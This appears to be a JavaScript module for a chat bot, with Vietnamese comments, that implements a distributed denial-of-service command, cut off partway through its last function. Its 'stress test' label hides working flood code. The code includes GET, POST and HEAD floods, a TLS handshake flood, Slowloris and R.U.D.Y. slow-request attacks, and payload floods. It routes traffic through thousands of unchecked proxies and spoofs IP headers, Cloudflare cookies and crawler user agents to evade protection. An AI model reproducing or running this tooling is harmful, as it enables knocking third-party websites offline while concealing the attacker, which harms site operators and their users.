import https from "node:https";
import http from "node:http";
import tls from "node:tls";
import net from "node:net";
import dgram from "node:dgram";
import { log } from "../logger.js";
import { proxyPool } from "../utils/managers/proxyPool.js";
import { getProxies } from "./proxy.js";

export const name = "ddos";
export const description = "Lệnh kiểm tra tải hệ thống (Stress Test)";

// ── User-Agents đa dạng ──────────────────────────────────────────────────────
const USER_AGENTS = [
    // ── Chrome Windows ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    // ── Chrome Mac ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    // ── Chrome Linux ──
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    // ── Firefox ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    // ── Safari ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    // ── Edge ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    // ── Opera ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    // ── Brave (Chrome-base, no extension flag) ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    // ── Mobile Chrome ──
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus Nord 3 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    // ── Mobile Safari (iPhone/iPad) ──
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    // ── Samsung Internet ──
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.0.0 Mobile Safari/537.36",
    // ── UCBrowser ──
    "Mozilla/5.0 (Linux; U; Android 12; en-US; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
    // ── Crawlers / Bots giả ──
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)",
];

const REFERERS = [
    "https://www.google.com/",
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    "https://duckduckgo.com/",
    "https://www.baidu.com/",
    "https://www.wikipedia.org/",
    "https://www.amazon.com/",
    "https://www.instagram.com/",
    "https://t.co/",
];

const ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,vi;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
];

const ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
    "br, gzip",
];

const CACHE_CONTROLS = [
    "no-cache",
    "max-age=0",
    "no-store",
    "no-cache, no-store",
    "max-age=0, must-revalidate",
];

const PATHS_FUZZ = [
    // ── Generic ──
    "/", "/index", "/index.html", "/index.php", "/home", "/main", "/start",
    "/search", "/login", "/signin", "/register", "/signup", "/contact", "/about",
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml", "/.env", "/.well-known/security.txt",
    // ── API ──
    "/api", "/api/v1", "/api/v2", "/api/v1/ping", "/api/v1/health",
    "/api/health", "/api/status", "/api/me", "/api/user", "/api/users",
    "/api/v1/users", "/api/v1/posts", "/api/v1/products", "/api/v1/search",
    "/graphql", "/api/graphql",
    // ── WordPress ──
    "/wp-admin", "/wp-login.php", "/wp-json/wp/v2/posts", "/wp-json/wp/v2/users",
    "/xmlrpc.php", "/wp-cron.php", "/wp-content/uploads/",
    // ── Laravel / PHP ──
    "/public/index.php", "/storage/logs/laravel.log", "/telescope",
    "/_debugbar", "/horizon", "/nova",
    // ── Next.js / React ──
    "/_next/static/chunks/main.js", "/_next/data/", "/api/auth/session",
    "/__nextjs_original-stack-frame",
    // ── Django / FastAPI / Flask ──
    "/admin/", "/accounts/login/", "/docs", "/redoc", "/openapi.json",
    "/__debug__/", "/metrics", "/healthz", "/readyz",
    // ── Node.js ──
    "/socket.io/", "/socket.io/?EIO=4&transport=polling",
    "/api/socket", "/api/events",
    // ── Static assets ──
    "/static/main.js", "/assets/bundle.js", "/assets/index.js",
    "/favicon.ico", "/manifest.json", "/sw.js",
    // ── Admin panels ──
    "/admin", "/administrator", "/dashboard", "/cpanel", "/phpmyadmin",
    "/admin/login", "/backend", "/manage", "/console",
];

// ── Thêm randomization arrays hiện đại ───────────────────────────────────────
const DEVICE_MEMORIES = ["0.25", "0.5", "1", "2", "4", "8"];
const DOWNLINKS       = ["0.35", "1.3", "3.5", "10", "15", "25", "50"];
const RTTS            = ["50", "100", "150", "250", "400", "600"];
const ECTS            = ["slow-2g", "2g", "3g", "4g"];
const VIEWPORTS       = ["360", "375", "390", "414", "768", "1024", "1280", "1366", "1440", "1920"];
const PLATFORMS       = ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"', '"Chrome OS"'];
const FETCH_DESTS     = ["document", "empty", "image", "script", "style", "font"];
const FETCH_MODES     = ["navigate", "cors", "no-cors", "same-origin"];
const FETCH_SITES     = ["cross-site", "same-origin", "same-site", "none"];

// ── Helpers ──────────────────────────────────────────────────────────────────
const randItem = arr => arr[Math.floor(Math.random() * arr.length)];
const randInt  = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const randHex  = len => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
const randIp   = () => `${randInt(1,254)}.${randInt(1,254)}.${randInt(1,254)}.${randInt(1,254)}`;

// Tạo chuỗi X-Forwarded-For giả nhiều hop (trông như request qua nhiều CDN/proxy)
const randIpChain = (hops = 3) =>
    Array.from({ length: hops }, () => randIp()).join(", ");

// ── ddosRawPool – Pool proxy raw (không check live) tối đa 20,000 ─────────────
// Dùng riêng cho DDoS, không bị giới hạn bởi proxyPool 180-cap
const ddosRawPool = (() => {
    let list = [];
    let idx  = 0;
    return {
        add(proxies) {
            const seen = new Set(list.map(p => `${p.ip}:${p.port}`));
            for (const p of proxies) {
                const k = `${p.ip}:${p.port}`;
                if (!seen.has(k)) { list.push(p); seen.add(k); }
            }
            if (list.length > 20000) list = list.slice(-20000);
        },
        next() {
            if (!list.length) return null;
            const p = list[idx % list.length];
            idx = (idx + 1) % list.length;
            return p;
        },
        size() { return list.length; },
    };
})();

// ── CONNECT tunnel: mở socket qua HTTP proxy (raw socket methods dùng proxy thật) ─
async function tunnelConnect(proxyIp, proxyPort, targetHost, targetPort, useSSL) {
    return new Promise((resolve, reject) => {
        const conn = net.createConnection({ host: proxyIp, port: parseInt(proxyPort) }, () => {
            conn.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
            let buf = "";
            const onData = chunk => {
                buf += chunk.toString("binary");
                if (!buf.includes("\r\n\r\n")) return;
                conn.removeListener("data", onData);
                if (buf.startsWith("HTTP/1.1 200") || buf.startsWith("HTTP/1.0 200")) {
                    if (useSSL) {
                        const s = tls.connect({ socket: conn, rejectUnauthorized: false, servername: targetHost });
                        s.on("secureConnect", () => resolve(s));
                        s.on("error", reject);
                    } else {
                        resolve(conn);
                    }
                } else {
                    conn.destroy();
                    reject(new Error("CONNECT failed"));
                }
            };
            conn.on("data", onData);
        });
        conn.on("error", reject);
        setTimeout(() => { conn.destroy(); reject(new Error("tunnel timeout")); }, 6000);
    });
}

function appendPath(base, path) {
    return base.replace(/\/$/, "") + "/" + path.replace(/^\//, "");
}

function buildBaseHeaders(extra = {}) {
    const ua       = randItem(USER_AGENTS);
    const isMobile = /Mobile|Android|iPhone|iPad|Samsung/.test(ua);
    const isBot    = /bot|crawl|spider|facebook|twitter|linkedin/i.test(ua);
    const chromeVer = randInt(119, 124);
    const platform  = randItem(PLATFORMS);

    const base = {
        "User-Agent"      : ua,
        "Accept"          : randItem([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "application/json, text/plain, */*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        ]),
        "Accept-Language" : randItem(ACCEPT_LANGS),
        "Accept-Encoding" : randItem(ACCEPT_ENCODINGS),
        "Cache-Control"   : randItem(CACHE_CONTROLS),
        "Pragma"          : "no-cache",
        "Referer"         : randItem(REFERERS) + randHex(6),
        "Connection"      : Math.random() > 0.4 ? "keep-alive" : "close",
    };

    // Chỉ thêm Sec-* cho Chrome-based (bot không có)
    if (!isBot) {
        Object.assign(base, {
            "Upgrade-Insecure-Requests" : "1",
            "Sec-Fetch-Dest"            : randItem(FETCH_DESTS),
            "Sec-Fetch-Mode"            : randItem(FETCH_MODES),
            "Sec-Fetch-Site"            : randItem(FETCH_SITES),
            "Sec-Fetch-User"            : "?1",
        });
    }

    // Sec-CH-UA chỉ cho Chrome/Edge/Brave
    if (/Chrome|Edg|OPR/.test(ua) && !isBot) {
        Object.assign(base, {
            "Sec-CH-UA"                    : `"Chromium";v="${chromeVer}", "Not)A;Brand";v="8", "Google Chrome";v="${chromeVer}"`,
            "Sec-CH-UA-Mobile"             : isMobile ? "?1" : "?0",
            "Sec-CH-UA-Platform"           : platform,
            "Sec-CH-UA-Platform-Version"   : `"${randInt(10, 14)}.0.0"`,
            "Sec-CH-UA-Full-Version-List"  : `"Chromium";v="${chromeVer}.0.${randInt(1000,9999)}.${randInt(10,99)}"`,
        });
    }

    // Network hints (thêm ngẫu nhiên ~50% request)
    if (Math.random() > 0.5) {
        Object.assign(base, {
            "Device-Memory"  : randItem(DEVICE_MEMORIES),
            "Downlink"       : randItem(DOWNLINKS),
            "RTT"            : randItem(RTTS),
            "ECT"            : randItem(ECTS),
        });
    }

    // Viewport width (thêm ngẫu nhiên ~40% request)
    if (Math.random() > 0.6) {
        base["Viewport-Width"] = randItem(VIEWPORTS);
    }

    // DNT (Do Not Track) ngẫu nhiên
    if (Math.random() > 0.5) base["DNT"] = "1";

    // Save-Data (tiết kiệm băng thông) ngẫu nhiên ~10%
    if (Math.random() > 0.9) base["Save-Data"] = "on";

    return { ...base, ...extra };
}

const attack_threads = new Map();

const MAX_ATTACK_TIME_MS      = 30 * 60 * 1000; // 30 phút (chế độ thường)
const INF_ATTACK_TIME_MS      = 999 * 60 * 1000; // ~16 giờ (chế độ inf)
const CONCURRENCY             = 2000;            // request chạy song song tối đa
const MIN_PROXY_BEFORE_ATTACK = 100;
const AUTO_DIG_COUNT          = 10000;
const AUTO_DIG_THRESHOLD      = 800;             // bắt đầu đào thêm proxy sớm hơn

// ── Auto-lấy proxy trực tiếp từ nguồn (không check live/die) ─────────────────
let isAutoDigging = false;
async function autoDigProxy(wantCount = AUTO_DIG_COUNT) {
    if (isAutoDigging) return;
    isAutoDigging = true;
    try {
        // log.info(`[DDOS] Đang lấy ${wantCount} proxy từ nguồn (không check)...`);
        const proxies = await getProxies(wantCount, null, null);
        if (proxies.length) {
            // Nạp vào proxyPool (axios-based methods) và ddosRawPool (raw socket methods)
            proxyPool.inject(proxies);
            ddosRawPool.add(proxies);
            // log.info(`[DDOS] Lấy xong: ${proxies.length} proxy. proxyPool: ${proxyPool.getStats().total} | rawPool: ${ddosRawPool.size()}`);
        } else {
            log.warn("[DDOS] Không lấy được proxy từ nguồn.");
        }
    } catch (e) {
        log.error(`[DDOS] Lỗi lấy proxy: ${e.message}`);
    } finally {
        isAutoDigging = false;
    }
}

// ── getSocket: kết nối raw socket, ưu tiên qua CONNECT proxy ─────────────────
async function getSocket(targetHost, targetPort, useSSL) {
    const proxy = ddosRawPool.next();
    if (proxy) {
        try {
            return await tunnelConnect(proxy.ip, proxy.port, targetHost, targetPort, useSSL);
        } catch { /* proxy không hỗ trợ CONNECT → fallback */ }
    }
    return new Promise((resolve, reject) => {
        let s;
        const t = setTimeout(() => { try { s.destroy(); } catch {} reject(new Error("direct timeout")); }, 5000);
        s = useSSL
            ? tls.connect({ host: targetHost, port: targetPort, rejectUnauthorized: false, servername: targetHost }, () => { clearTimeout(t); resolve(s); })
            : net.createConnection({ host: targetHost, port: targetPort }, () => { clearTimeout(t); resolve(s); });
        s.on("error", e => { clearTimeout(t); reject(e); });
    });
}

// ── Các phương thức tấn công ─────────────────────────────────────────────────

/** 1. FLOOD – GET nhanh, randomize cache-bust + path */
async function method_flood(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}?_=${Date.now()}&r=${randHex(8)}&nocache=${randInt(1e6, 9e9)}`;
    const headers = buildBaseHeaders();
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 4000,
            maxRedirects: 3,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 2. BYPASS – Giả lập browser thật, theo redirect, gửi cookie */
async function method_bypass(target_url) {
    const url = `${target_url}?${randHex(6)}=${randHex(8)}&t=${Date.now()}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For"   : randIp(),
        "X-Real-IP"         : randIp(),
        "X-Originating-IP"  : randIp(),
        "CF-Connecting-IP"  : randIp(),
        "True-Client-IP"    : randIp(),
        "Forwarded"         : `for=${randIp()}`,
        "Cookie"            : `_ga=GA1.2.${randInt(1e9,9e9)}.${randInt(1e9,9e9)}; _gid=GA1.2.${randInt(1e9,9e9)}.${randInt(1e9,9e9)}; session=${randHex(32)}`,
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 6000,
            maxRedirects: 5,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 3. UAM – User-Agent Mimicry đầy đủ + IP spoofing */
async function method_uam(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For" : `${randIp()}, ${randIp()}, ${randIp()}`,
        "X-Real-IP"       : randIp(),
        "CF-Connecting-IP": randIp(),
        "X-Client-IP"     : randIp(),
        "X-Cluster-Client-IP": randIp(),
        "Forwarded"       : `for="${randIp()}";proto=https`,
        "Via"             : `1.1 ${randHex(8)}.cloudfront.net (CloudFront)`,
        "X-Amz-Cf-Id"    : randHex(32),
        "Cookie"          : `__cfduid=${randHex(43)}; __cfuid=${randHex(32)}; cf_clearance=${randHex(64)}`,
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 5000,
            maxRedirects: 3,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 4. TLS – TLS handshake flood, ưu tiên qua proxy CONNECT tunnel */
async function method_tls(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `https://${target_url}`);
    const host = parsed.hostname;
    const port = parseInt(parsed.port) || 443;
    return new Promise(async resolve => {
        const timeout = setTimeout(() => resolve(null), 6000);
        try {
            const socket = await getSocket(host, port, true);
            const req =
                `GET ${randItem(PATHS_FUZZ)}?t=${Date.now()}&r=${randHex(6)} HTTP/1.1\r\n` +
                `Host: ${host}\r\n` +
                `User-Agent: ${randItem(USER_AGENTS)}\r\n` +
                `X-Forwarded-For: ${randIpChain(2)}\r\n` +
                `Accept: */*\r\n` +
                `Connection: close\r\n\r\n`;
            socket.write(req);
            socket.on("data", () => { clearTimeout(timeout); socket.destroy(); resolve(200); });
            socket.on("error", () => { clearTimeout(timeout); resolve(null); });
            socket.on("close", () => { clearTimeout(timeout); resolve(null); });
        } catch { clearTimeout(timeout); resolve(null); }
    });
}

/** 5. HTTPS – HTTPS flood với nhiều kết nối đồng thời, header đầy đủ */
async function method_https(target_url) {
    let url = target_url.startsWith("https://") ? target_url : target_url.replace(/^http:\/\//, "https://");
    url += `${randItem(PATHS_FUZZ)}?v=${randInt(1,999)}&_=${Date.now()}`;
    const headers = buildBaseHeaders({
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-Proto": "https",
        "X-Forwarded-For"  : randIp(),
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 4000,
            maxRedirects: 5,
            validateStatus: () => true,
            httpsAgent: new https.Agent({
                keepAlive: true,
                rejectUnauthorized: false,
                minVersion: "TLSv1.2",
            }),
        });
        return res.status;
    } catch { return null; }
}

/** 6. R2 – Randomized path + query flood (tránh cache) */
async function method_r2(target_url) {
    const randomPath = `/${randHex(6)}/${randHex(4)}.${randItem(["html","php","asp","jsp","json","xml","txt"])}`;
    const url = `${target_url}${randomPath}?${randHex(4)}=${randHex(8)}&${randHex(4)}=${randHex(6)}&t=${Date.now()}`;
    const headers = buildBaseHeaders({
        "X-Forwarded-For": randIp(),
        "Cache-Control"  : "no-store, no-cache, must-revalidate",
        "Pragma"         : "no-cache",
        "Expires"        : "0",
    });
    try {
        const res = await proxyPool.axios({
            method: "GET", url, headers,
            timeout: 4000,
            maxRedirects: 2,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: false, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 7. GYAT – POST flood với body ngẫu nhiên (JSON / Form / Multipart) */
async function method_gyat(target_url) {
    const url = `${target_url}${randItem(["/api/submit", "/api/data", "/api/v1/events", "/form", "/upload", "/login", "/search"])}`;
    const type = randInt(0, 2);
    let data, contentType;

    if (type === 0) {
        data = JSON.stringify({
            id: randHex(16),
            timestamp: Date.now(),
            data: randHex(64),
            token: randHex(32),
            payload: Array.from({ length: randInt(5, 20) }, () => ({ k: randHex(4), v: randHex(8) })),
        });
        contentType = "application/json";
    } else if (type === 1) {
        const params = new URLSearchParams();
        for (let i = 0; i < randInt(5, 15); i++) params.append(randHex(4), randHex(randInt(4, 32)));
        data = params.toString();
        contentType = "application/x-www-form-urlencoded";
    } else {
        data = `{"query":"${randHex(32)}","variables":{}}`;
        contentType = "application/json";
    }

    const headers = buildBaseHeaders({
        "Content-Type"   : contentType,
        "Content-Length" : String(Buffer.byteLength(data)),
        "Origin"         : target_url,
        "X-Forwarded-For": randIp(),
    });

    try {
        const res = await proxyPool.axios({
            method: "POST", url, data, headers,
            timeout: 5000,
            maxRedirects: 2,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 8. SLOWLORIS – Mở nhiều kết nối TCP, gửi header chậm, qua proxy CONNECT */
async function method_slowloris(target_url) {
    const parsed = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host   = parsed.hostname;
    const port   = parseInt(parsed.port) || (parsed.protocol === "https:" ? 443 : 80);
    const useSSL = parsed.protocol === "https:";
    return new Promise(async resolve => {
        const timeout = setTimeout(() => resolve(200), 12000);
        try {
            const socket = await getSocket(host, port, useSSL);
            const initReq =
                `GET ${randItem(PATHS_FUZZ)}?t=${Date.now()} HTTP/1.1\r\n` +
                `Host: ${host}\r\n` +
                `User-Agent: ${randItem(USER_AGENTS)}\r\n` +
                `X-Forwarded-For: ${randIpChain(2)}\r\n` +
                `Accept: */*\r\n`;
            socket.write(initReq);
            let count = 0;
            const sendSlowHeader = () => {
                if (count++ >= randInt(30, 60)) {
                    clearTimeout(timeout); try { socket.destroy(); } catch {} resolve(200); return;
                }
                try { socket.write(`X-${randHex(6)}: ${randHex(randInt(8, 20))}\r\n`); }
                catch { clearTimeout(timeout); resolve(null); return; }
                setTimeout(sendSlowHeader, randInt(400, 1200));
            };
            sendSlowHeader();
            socket.on("error", () => { clearTimeout(timeout); resolve(null); });
        } catch { clearTimeout(timeout); resolve(null); }
    });
}

/** 9. HEAD – HEAD request flood (tốn băng thông server để trả về, nhẹ hơn cho attacker) */
async function method_head(target_url) {
    const url = `${target_url}${randItem(PATHS_FUZZ)}?_=${Date.now()}&v=${randHex(6)}`;
    const headers = buildBaseHeaders({ "X-Forwarded-For": randIp() });
    try {
        const res = await proxyPool.axios({
            method: "HEAD", url, headers,
            timeout: 3000,
            maxRedirects: 2,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
        });
        return res.status;
    } catch { return null; }
}

/** 10. RUDY – R.U.D.Y. Slow POST (gửi body cực chậm, giữ kết nối mãi) */
async function method_rudy(target_url) {
    const parsed  = new URL(target_url.startsWith("http") ? target_url : `http://${target_url}`);
    const host    = parsed.hostname;
    const port    = parseInt(parsed.port) || (parsed.protocol === "https:" ? 443 : 80);
    const useSSL  = parsed.protocol === "https:";
    const bodyLen = randInt(100000, 999999);
    return new Promise(async resolve => {
        const totalTimeout = setTimeout(() => resolve(200), 20000);
        try {
            const socket = await getSocket(host, port, useSSL);
            const path   = randItem(PATHS_FUZZ.filter(p => !p.includes(".")));
            socket.write(
                `POST ${path} HTTP/1.1\r\n` +
                `Host: ${host}\r\n` +
                `User-Agent: ${randItem(USER_AGENTS)}\r\n` +
                `X-Forwarded-For: ${randIpChain(2)}\r\n` +
                `Content-Type: application/x-www-form-urlencoded\r\n` +
                `Content-Length: ${bodyLen}\r\n` +
                `Connection: keep-alive\r\n\r\n`
            );
            let sent = 0;
            const drip = () => {
                if (sent >= bodyLen) { clearTimeout(totalTimeout); try { socket.destroy(); } catch {} resolve(200); return; }
                try { socket.write(randHex(1)); } catch { clearTimeout(totalTimeout); resolve(null); return; }
                sent++;
                setTimeout(drip, randInt(700, 1800));
            };
            drip();
            socket.on("error", () => { clearTimeout(totalTimeout); resolve(null); });
        } catch { clearTimeout(totalTimeout); resolve(null); }
    });
}

/** 11. STRESS – Heavy payload flood (body 50KB–200KB, kiệt sức băng thông + CPU parse) */
async function method_stress(target_url) {
    const size = randInt(50000, 200000);
    const data = randHex(size);
    const headers = buildBaseHeaders({
        "Content-Type"  : "application/octet-stream",
        "Content-Length": String(size),
        "X-Forwarded-For": randIp(),
    });
    try {
        const res = await proxyPool.axios({
            method: "POST",
            url: `${target_url}${randItem(PATHS_FUZZ)}?t=${Date.now()}`,
            data, headers,
            timeout: 8000,
            maxRedirects: 0,
            validateStatus: () => true,
            httpsAgent: new https.Agent({ keepAlive: false, rejectUnauthorized: false }),
        });
